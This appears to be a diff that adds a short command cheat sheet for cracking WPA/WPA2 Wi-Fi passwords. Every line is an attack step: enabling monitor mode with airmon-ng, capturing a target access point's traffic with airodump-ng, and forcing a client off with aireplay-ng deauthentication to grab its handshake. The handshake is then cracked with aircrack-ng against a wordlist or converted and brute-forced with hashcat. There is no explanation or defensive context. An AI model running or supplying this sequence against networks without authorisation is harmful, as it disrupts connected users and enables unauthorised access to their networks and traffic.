@@ -1,0 +1,10 @@
+airmon-ng check kill
+airmon-ng start wlan0
+airodump-ng wlan0mon
+airodump-ng -c <channel> --bssid <AP> -w <file> wlan0mon
+aireplay-ng -0 2 -c <client> -a <AP> wlan0mon
+aircrack-ng -a2 -b <AP> -w <dict> *.cap
+cap2hccapx _.cap _.hccapx
+hcxpcapngtool -o <file> _.cap
+hashcat -m 2500 -a 3 _.hccapx ?u?l?d?s?a?b
+hashcat -m 22000 -a 3 <file> ?u?l?d?s?a?b
